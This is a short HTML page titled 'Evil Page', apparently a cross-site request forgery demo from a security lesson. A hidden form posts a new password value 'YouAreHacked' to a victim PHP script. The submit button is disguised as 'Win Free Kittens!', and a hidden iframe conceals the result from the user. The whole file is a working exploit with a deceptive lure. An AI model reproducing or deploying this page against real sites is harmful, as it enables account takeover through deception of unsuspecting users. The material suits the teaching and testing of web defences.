<html>
<head>
    <title>Evil Page</title>
    <style>
        input { font-size: 50px; -webkit-appearance: button; }
        #attack { display: none; }
//        #attack { border: 2px solid red; width: 300px; height: 50px }
    </style>
</head>
<body>
    <form method="POST" action="2.36.csrf.victim.php" target="attack">
        <input type="hidden" name="newpass" value="YouAreHacked" />
        <input type="submit" value="Win Free Kittens!" />
    </form>
    <iframe id="attack" />
</body>
</html>
